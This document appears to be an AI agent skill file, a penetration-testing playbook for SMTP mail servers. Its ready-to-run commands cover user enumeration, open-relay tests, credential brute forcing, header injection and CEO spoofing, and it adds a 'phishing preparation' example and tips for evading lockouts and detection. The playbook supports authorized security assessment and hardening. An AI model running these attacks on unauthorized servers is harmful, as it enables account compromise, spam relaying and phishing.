---
name: SMTP Penetration Testing
description: This skill should be used when the user asks to "perform SMTP penetration testing", "enumerate email users", "test for open mail relays", "grab SMTP banners", "brute force email credentials", or "assess mail server security". It provides comprehensive techniques for testing SMTP server security.
version: 1.0.0
tags: [smtp, email, mail-server, user-enumeration, open-relay, penetration-testing]
---

# SMTP Penetration Testing

## Purpose

Conduct comprehensive security assessments of SMTP (Simple Mail Transfer Protocol) servers to identify vulnerabilities including open relays, user enumeration, weak authentication, and misconfiguration. This skill covers banner grabbing, user enumeration techniques, relay testing, brute force attacks, and security hardening recommendations.

## Prerequisites

### Required Tools
```bash
# Nmap with SMTP scripts
sudo apt-get install nmap

# Netcat
sudo apt-get install netcat

# Hydra for brute force
sudo apt-get install hydra

# SMTP user enumeration tool
sudo apt-get install smtp-user-enum

# Metasploit Framework
msfconsole
```

### Required Knowledge
- SMTP protocol fundamentals
- Email architecture (MTA, MDA, MUA)
- DNS and MX records
- Network protocols

### Required Access
- Target SMTP server IP/hostname
- Written authorization for testing
- Wordlists for enumeration and brute force

## Outputs and Deliverables

1. **SMTP Security Assessment Report** - Comprehensive vulnerability findings
2. **User Enumeration Results** - Valid email addresses discovered
3. **Relay Test Results** - Open relay status and exploitation potential
4. **Remediation Recommendations** - Security hardening guidance

## Core Workflow

### Phase 1: SMTP Architecture Understanding

Understand SMTP components and workflow:

```
SMTP Components:
- Mail Transfer Agent (MTA): Transfers email between servers
- Mail Delivery Agent (MDA): Delivers email to recipient mailbox
- Mail User Agent (MUA): Email client software

SMTP Ports:
- Port 25: Standard SMTP (often blocked by ISPs)
- Port 465: SMTP over SSL (deprecated but still used)
- Port 587: SMTP submission with STARTTLS
- Port 2525: Alternative SMTP port

SMTP Workflow:
1. Sender MUA → Sender MTA (outgoing)
2. Sender MTA → DNS lookup for recipient MX
3. Sender MTA → Recipient MTA (relay)
4. Recipient MTA → Recipient MDA
5. Recipient MDA → Recipient MUA (retrieval via IMAP/POP3)
```

### Phase 2: SMTP Service Discovery

Identify SMTP servers and versions:

```bash
# Discover SMTP ports
nmap -p 25,465,587,2525 -sV TARGET_IP

# Aggressive service detection
nmap -sV -sC -p 25 TARGET_IP

# SMTP-specific scripts
nmap --script=smtp-* -p 25 TARGET_IP

# Discover MX records for domain
dig MX target.com
nslookup -type=mx target.com
host -t mx target.com
```

### Phase 3: Banner Grabbing

Retrieve SMTP server information:

```bash
# Using Telnet
telnet TARGET_IP 25
# Response: 220 mail.target.com ESMTP Postfix

# Using Netcat
nc TARGET_IP 25
# Response: 220 mail.target.com ESMTP

# Using Nmap
nmap -sV -p 25 TARGET_IP
# Version detection extracts banner info

# Manual SMTP commands
EHLO test
# Response reveals supported extensions
```

Parse banner information:

```
Banner reveals:
- Server software (Postfix, Sendmail, Exchange)
- Version information
- Hostname
- Supported SMTP extensions (STARTTLS, AUTH, etc.)
```

### Phase 4: SMTP Command Enumeration

Test available SMTP commands:

```bash
# Connect and test commands
nc TARGET_IP 25

# Initial greeting
EHLO attacker.com

# Response shows capabilities:
250-mail.target.com
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-STARTTLS
250-AUTH PLAIN LOGIN
250-8BITMIME
250 DSN
```

Key commands to test:

```bash
# VRFY - Verify user exists
VRFY admin
250 2.1.5 admin@target.com

# EXPN - Expand mailing list
EXPN staff
250 2.1.5 user1@target.com
250 2.1.5 user2@target.com

# RCPT TO - Recipient verification
MAIL FROM:<test@attacker.com>
RCPT TO:<admin@target.com>
# 250 OK = user exists
# 550 = user doesn't exist
```

### Phase 5: User Enumeration

Enumerate valid email addresses:

```bash
# Using smtp-user-enum with VRFY
smtp-user-enum -M VRFY -U /usr/share/wordlists/users.txt -t TARGET_IP

# Using EXPN method
smtp-user-enum -M EXPN -U /usr/share/wordlists/users.txt -t TARGET_IP

# Using RCPT method
smtp-user-enum -M RCPT -U /usr/share/wordlists/users.txt -t TARGET_IP

# Specify port and domain
smtp-user-enum -M VRFY -U users.txt -t TARGET_IP -p 25 -d target.com
```

Using Metasploit:

```bash
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS TARGET_IP
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
set UNIXONLY true
run
```

Using Nmap:

```bash
# SMTP user enumeration script
nmap --script smtp-enum-users -p 25 TARGET_IP

# With custom user list
nmap --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} -p 25 TARGET_IP
```

### Phase 6: Open Relay Testing

Test for unauthorized email relay:

```bash
# Using Nmap
nmap -p 25 --script smtp-open-relay TARGET_IP

# Manual testing via Telnet
telnet TARGET_IP 25
HELO attacker.com
MAIL FROM:<test@attacker.com>
RCPT TO:<victim@external-domain.com>
DATA
Subject: Relay Test
This is a test.
.
QUIT

# If accepted (250 OK), server is open relay
```

Using Metasploit:

```bash
use auxiliary/scanner/smtp/smtp_relay
set RHOSTS TARGET_IP
run
```

Test variations:

```bash
# Test different sender/recipient combinations
MAIL FROM:<>
MAIL FROM:<test@[attacker_IP]>
MAIL FROM:<test@target.com>

RCPT TO:<test@external.com>
RCPT TO:<"test@external.com">
RCPT TO:<test%external.com@target.com>
```

### Phase 7: Brute Force Authentication

Test for weak SMTP credentials:

```bash
# Using Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt smtp://TARGET_IP

# With specific port and SSL
hydra -l admin -P passwords.txt -s 465 -S TARGET_IP smtp

# Multiple users
hydra -L users.txt -P passwords.txt TARGET_IP smtp

# Verbose output
hydra -l admin -P passwords.txt smtp://TARGET_IP -V
```

Using Medusa:

```bash
medusa -h TARGET_IP -u admin -P /path/to/passwords.txt -M smtp
```

Using Metasploit:

```bash
use auxiliary/scanner/smtp/smtp_login
set RHOSTS TARGET_IP
set USER_FILE /path/to/users.txt
set PASS_FILE /path/to/passwords.txt
set VERBOSE true
run
```

### Phase 8: SMTP Command Injection

Test for command injection vulnerabilities:

```bash
# Header injection test
MAIL FROM:<attacker@test.com>
RCPT TO:<victim@target.com>
DATA
Subject: Test
Bcc: hidden@attacker.com
X-Injected: malicious-header

Injected content
.
```

Email spoofing test:

```bash
# Spoofed sender
MAIL FROM:<ceo@target.com>
RCPT TO:<employee@target.com>
DATA
From: CEO <ceo@target.com>
To: employee@target.com
Subject: Urgent Request

Please process this request immediately.
.
```

### Phase 9: TLS/SSL Security Testing

Test encryption configuration:

```bash
# Check STARTTLS support
openssl s_client -connect TARGET_IP:25 -starttls smtp

# Direct SSL connection (port 465)
openssl s_client -connect TARGET_IP:465

# Check certificate details
openssl s_client -connect TARGET_IP:25 -starttls smtp 2>/dev/null | openssl x509 -noout -text

# Test TLS versions
nmap --script ssl-enum-ciphers -p 25 TARGET_IP
```

### Phase 10: SPF, DKIM, DMARC Analysis

Check email authentication records:

```bash
# SPF record lookup
dig TXT target.com | grep spf
nslookup -type=txt target.com

# DKIM record lookup
dig TXT selector._domainkey.target.com

# DMARC record lookup
dig TXT _dmarc.target.com

# Analyze SPF policy
# v=spf1 include:_spf.google.com -all
# -all = strict (fail), ~all = soft fail, ?all = neutral
```

## Quick Reference

### Essential SMTP Commands

| Command | Purpose | Example |
|---------|---------|---------|
| HELO | Identify client | `HELO client.com` |
| EHLO | Extended HELO | `EHLO client.com` |
| MAIL FROM | Set sender | `MAIL FROM:<sender@test.com>` |
| RCPT TO | Set recipient | `RCPT TO:<user@target.com>` |
| DATA | Start message body | `DATA` |
| VRFY | Verify user | `VRFY admin` |
| EXPN | Expand alias | `EXPN staff` |
| QUIT | End session | `QUIT` |

### SMTP Response Codes

| Code | Meaning |
|------|---------|
| 220 | Service ready |
| 221 | Closing connection |
| 250 | OK / Requested action completed |
| 354 | Start mail input |
| 421 | Service not available |
| 450 | Mailbox unavailable |
| 550 | User unknown / Mailbox not found |
| 553 | Mailbox name not allowed |

### Enumeration Tool Commands

| Tool | Command |
|------|---------|
| smtp-user-enum | `smtp-user-enum -M VRFY -U users.txt -t IP` |
| Nmap | `nmap --script smtp-enum-users -p 25 IP` |
| Metasploit | `use auxiliary/scanner/smtp/smtp_enum` |
| Netcat | `nc IP 25` then manual commands |

### Common Vulnerabilities

| Vulnerability | Risk | Test Method |
|--------------|------|-------------|
| Open Relay | High | Relay test with external recipient |
| User Enumeration | Medium | VRFY/EXPN/RCPT commands |
| Banner Disclosure | Low | Banner grabbing |
| Weak Auth | High | Brute force attack |
| No TLS | Medium | STARTTLS test |
| Missing SPF/DKIM | Medium | DNS record lookup |

## Constraints and Limitations

### Legal Requirements
- Only test SMTP servers you own or have authorization to test
- Sending spam or malicious emails is illegal
- Document all testing activities
- Do not abuse discovered open relays

### Technical Limitations
- VRFY/EXPN often disabled on modern servers
- Rate limiting may slow enumeration
- Some servers respond identically for valid/invalid users
- Greylisting may delay enumeration responses

### Ethical Boundaries
- Never send actual spam through discovered relays
- Do not harvest email addresses for malicious use
- Report open relays to server administrators
- Use findings only for authorized security improvement

## Examples

### Example 1: Complete SMTP Assessment

**Scenario:** Full security assessment of mail server

```bash
# Step 1: Service discovery
nmap -sV -sC -p 25,465,587 mail.target.com

# Step 2: Banner grab
nc mail.target.com 25
EHLO test.com
QUIT

# Step 3: User enumeration
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t mail.target.com

# Step 4: Open relay test
nmap -p 25 --script smtp-open-relay mail.target.com

# Step 5: Authentication test
hydra -l admin -P /usr/share/wordlists/fasttrack.txt smtp://mail.target.com

# Step 6: TLS check
openssl s_client -connect mail.target.com:25 -starttls smtp

# Step 7: Check email authentication
dig TXT target.com | grep spf
dig TXT _dmarc.target.com
```

### Example 2: User Enumeration Attack

**Scenario:** Enumerate valid users for phishing preparation

```bash
# Method 1: VRFY
smtp-user-enum -M VRFY -U users.txt -t 192.168.1.100 -p 25

# Method 2: RCPT with timing analysis
smtp-user-enum -M RCPT -U users.txt -t 192.168.1.100 -p 25 -d target.com

# Method 3: Metasploit
msfconsole
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS 192.168.1.100
set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
run

# Results show valid users
[+] 192.168.1.100:25 - Found user: admin
[+] 192.168.1.100:25 - Found user: root
[+] 192.168.1.100:25 - Found user: postmaster
```

### Example 3: Open Relay Exploitation

**Scenario:** Test and document open relay vulnerability

```bash
# Test via Telnet
telnet mail.target.com 25
HELO attacker.com
MAIL FROM:<test@attacker.com>
RCPT TO:<test@gmail.com>
# If 250 OK - VULNERABLE

# Document with Nmap
nmap -p 25 --script smtp-open-relay --script-args smtp-open-relay.from=test@attacker.com,smtp-open-relay.to=test@external.com mail.target.com

# Output:
# PORT   STATE SERVICE
# 25/tcp open  smtp
# |_smtp-open-relay: Server is an open relay (14/16 tests)
```

## Troubleshooting

### Connection Refused

**Problem:** Cannot connect to SMTP port

**Solutions:**
1. Verify port is open: `nmap -p 25 TARGET`
2. Check firewall rules on both ends
3. ISP may block port 25 outbound
4. Try alternative ports (587, 465)
5. Use VPN or different network

### VRFY/EXPN Disabled

**Problem:** Server rejects VRFY and EXPN commands

**Solutions:**
1. Use RCPT TO method for enumeration
2. Analyze response time differences
3. Check response code variations
4. Try during off-peak hours
5. Use slower enumeration to avoid detection

### Brute Force Blocked

**Problem:** Account lockout or rate limiting

**Solutions:**
1. Slow down attack speed: `hydra -W 5 ...`
2. Use different source IPs
3. Focus on targeted password list
4. Try password spraying instead
5. Check for fail2ban or similar protection

### SSL/TLS Errors

**Problem:** Cannot establish encrypted connection

**Solutions:**
1. Check correct port (465 for SSL, 25/587 for STARTTLS)
2. Verify server supports STARTTLS: `EHLO` response
3. Use appropriate openssl command
4. Check for certificate issues
5. Try different TLS versions

## Security Recommendations

### For Administrators

1. **Disable Open Relay** - Require authentication for external delivery
2. **Disable VRFY/EXPN** - Prevent user enumeration
3. **Enforce TLS** - Require STARTTLS for all connections
4. **Implement SPF/DKIM/DMARC** - Prevent email spoofing
5. **Rate Limiting** - Prevent brute force attacks
6. **Account Lockout** - Lock accounts after failed attempts
7. **Banner Hardening** - Minimize server information disclosure
8. **Log Monitoring** - Alert on suspicious activity
9. **Patch Management** - Keep SMTP software updated
10. **Access Controls** - Restrict SMTP to authorized IPs
